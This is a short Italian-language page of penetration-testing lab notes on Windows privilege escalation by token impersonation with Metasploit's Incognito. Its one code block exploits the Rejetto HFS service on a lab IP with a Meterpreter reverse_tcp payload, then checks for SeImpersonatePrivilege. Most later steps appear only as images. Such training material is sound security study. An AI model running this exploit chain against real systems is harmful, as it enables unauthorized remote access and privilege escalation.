# Windows Privilege Escalation: Token Impersonation With Incognito

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Senza i Windows Access Token dovremmo inserire username e password ogni volta che lanciamo un programma, non solo all'ingresso nell'utente Windows.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

## Enumeration & Exploitation per accesso target

```
service postgresql start && msfconsole
workspace -a Impersonate
workspace
setg RHOSTS 10.2.16.112
db_nmap -sV 10.2.16.112
search rejetto
use exploit/windows/http/rejetto_hfs_exec
set patload windows/x64/meterpreter/reverse_tcp
show options
exploit
getuid
getprivs //Abbiamo SeImpersonatePrivilege quindi possiamo impersonare un token
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

La sessione meterpreter è già x64 quindi non dobbiamo migrare ad un altro processo.

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

NT AUTHORITY\LOCAL SERVICE significa che abbiamo i permessi associati ad un servizio running in locale (local service), e il motivo per il quale abbiamo questo account è perché abbiamo exploitato un servizio (hfs rejetto http file server service).

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Abbiamo SeImpersonatePrivilege quindi possiamo impersonare un token.
